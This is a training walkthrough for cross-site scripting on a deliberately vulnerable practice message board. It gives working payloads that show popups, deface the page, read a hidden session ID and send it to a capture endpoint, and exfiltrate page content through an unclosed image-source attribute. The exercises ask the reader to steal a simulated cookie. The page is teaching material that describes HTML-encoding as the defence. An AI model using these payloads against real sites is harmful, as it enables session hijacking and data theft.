---
title: Cross-Site Scripting (XSS) Walkthrough
---
Cross-Site Scripting (XSS) is a type of injection attack where scripts, links, or other malicious code is inserted into user-supplied content on a website. [OWASP](https://owasp.org/) considers "cross-site scripting" to be a misnomer since not all attacks involve more than one website. Nevertheless, it is the industry-accepted name for this type of attack.

_**Warning:** Attempting to attack a website or computer system without authorization is illegal. While doing this walkthrough and experimenting with the website, you have permission to practice XSS exploits on [ScriptBoard.dicax.org](https://scriptboard.dicax.org). Nevertheless, you are **not** permitted to attack or seek vulnerabilities on the web server or its host. You should use the knowledge you gain from these activities to make your own applications more secure. You should not use the knowledge and skills you gain to attack other sites without permission from the owners. ScriptBoard is designed to restrict your exploits to your own computer and session. You should not attempt to break into other users' sessions._

[ScriptBoard](https://scriptboard.dicax.org) simulates an online forum or message board with two special characteristics. First, it is vulnerable to XSS type exploits. Second, each session is restricted to viewing the messages posted from that session. In other words, you can only see your own message. This is to keep you from posting exploits that would affect some else.

Browse to [https://scriptboard.dicax.org](https://scriptboard.dicax.org). You will see an empty message. Write a message and click `Post` to see how it works.

The message board supports HTML so that you can format text. (You will exploit that later.) For now, post something benign like bolding some text.

```
Rise and <b>shout!</b>
```

Create a simple exploit by putting a popup message on the screen. This sort of thing is a quick way to test whether a site has XSS vulnerabilities.

```
<span onmouseover="alert('gotcha!')">My name is Scott!</span>
```

Hover over the new message ahd you should get a message.

You can use some script to **deface** the site by changing text. A more sophisticated attack might even add photos. Compared to what's possible, this one is relatively mild:

```
<b>Show me.</b>
<script>
document.getElementById("sitename").textContent = "Freefall Experience";
</script>
```

Notice that the title has changed. Of course, this walkthrough gave away that the needed element ID is `sitename` Suppose you didn't know the ID. You could find it by opening the inspector in the browser and locating the appropriate element in the HTML tree.

You can retrieve data from other sites and insert it. Here's an example that gets a scripture from our [Scripture of the Day service](https://scripture.dicax.org) and inserts it into the message board.

```
<span id="xss43"></span>
<script>
fetch("https://scripture.dicax.org/api/second")
    .then((response) => response.json())
    .then((json) => document.getElementById("xss43").textContent = json.text);
</script>
```

More damaging would be to steal data from a site and post it somewhere else. ScriptBoard has a URL for capturing information at [https://scriptboard.dicax.org/Capture](https://scriptboard.dicax.org/Capture). Anything you put in the query string or the POST data will be captured and you can view all captures by browsing to [https://scriptboard.dicax.org/ViewCaptures](https://scriptboard.dicax.org/ViewCaptures). (A `Captures` link is in the upper-right.)

The page has a hidden element storing the `Session ID`. Retrieve that data and send it to the capture URL like this:

```
<script>
fetch("/Capture?id=" + document.getElementById("sessionId").textContent);
</script>
No exploit here. Nope, definitely not!
```

Now look at the [ViewCaptures](https://scriptboard.dicax.org/ViewCaptures) page to see what has been collected.

Scripting doesn't have to be enabled to successfully apply an XSS attack. Here we deliberately fail to close quotes on an image link. The browser will treat everything up to the next quote as part of the query string. And, since the link is to the `Captures` URL the data will be captured. After putting this in a post, go check [ViewCaptures](https://scriptboard.dicax.org/ViewCaptures) to see what it found.

```
Hello.<img src="/Capture?data=
```

One common way to prevent XSS attacks is to HTML encode all user-provided content. While this method doesn't support rich text, it ensures that no malicious code can be injected. ScriptBoard has a "safe" version of the main page does just that; HTML Encode all user-supplied data. Click the `Safe` link in the upper-right menu to see all of the posts without exploits.

## On Your Own

You can experiment with other XSS exploits on the site. Try to do the following, or come up with your own exploits:

* The page has some JavaScript that will unscramble a hidden message. Make that message appear somewhere or send it to the captures.
* The page has a hidden `sessionId` capture or display that information.
* Steal the session cookie and send it to the captures. (Note: The real session cookie is protected from JavaScript. The one you can find with an exploit is a simulated session cookie.)
* Change colors or fonts.

_**Remember:** You are authorized to experiment with exploits on your own ScriptBoard session. While the server doesn't have known cross-session vulnerabilities we still don't authorize you to attempt breaking into the server or accessing other sessions._